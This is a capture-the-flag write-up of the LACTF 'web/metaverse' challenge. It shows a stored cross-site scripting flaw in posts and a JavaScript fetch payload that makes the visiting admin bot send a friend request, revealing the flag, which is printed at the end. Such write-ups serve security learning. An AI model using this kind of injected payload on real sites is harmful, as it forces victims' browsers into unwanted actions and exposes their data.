LACTF— web/metaverse
====================

![image](https://github.com/darkcheftar/write-ups/assets/54063851/cf96828c-c7fb-4dd8-94eb-67fdd3d34905)

LACTF

In [lactf](https://ctftime.org/event/1732) I was able to solve web/metaverse challenge.
![image](https://github.com/darkcheftar/write-ups/assets/54063851/028614b7-8dad-427b-9a75-653293027ca2)

![image](https://github.com/darkcheftar/write-ups/assets/54063851/ca8519b8-af74-49e0-8985-c9b4d70562ba)


Login page

![image](https://github.com/darkcheftar/write-ups/assets/54063851/1532d3a4-3583-48ca-9b61-25bf0296df0c)


Registering to service

[Here](https://gist.github.com/darkcheftar/a0746f59bacf8d8d491ad60ce0e45d22) is the source code provided 

From source code we can see that the flag is the display name of admin

And we can only see if admin adds us as a friend

![image](https://github.com/darkcheftar/write-ups/assets/54063851/b304f44c-123c-4110-8b0b-4a0265286ac8)


We can post using the below section

![image](https://github.com/darkcheftar/write-ups/assets/54063851/c310279e-0581-49b1-b20f-51d785bf578f)


If I try to add JavaScript to the post it executes

![image](https://github.com/darkcheftar/write-ups/assets/54063851/c53d23ac-4faa-4198-b4fe-a9744660f82f)

As we can see the we can add someone as a friend by making a post request

to /friend with our username

so we create a post with the below js payload
```js
fetch("/friend", 
{
     method: "POST", 
     body: "username=" + encodeURIComponent("darkcheftar"), 
     headers: { "Content-Type": "application/x-www-form-urlencoded" } 
}).then(e => e.text().then(t => { 
        if (200 !== e.status) { 
            document.querySelector(".error")?.remove(); 
            let r = document.createElement("p"); 
            r.innerText = t, 
            r.classList.add("error"), 
            document.body.insertAdjacentElement("afterbegin", r) 
        } 
        else location.reload() 
}))
```
by sharing the link to the admin bot he adds us as a friend.

now we can see the flag

![image](https://github.com/darkcheftar/write-ups/assets/54063851/5bba1152-f740-4ce8-936c-f2e1ae25f7df)


Finally the flag is:

> lactf{please\_metaget\_me\_out\_of\_here}
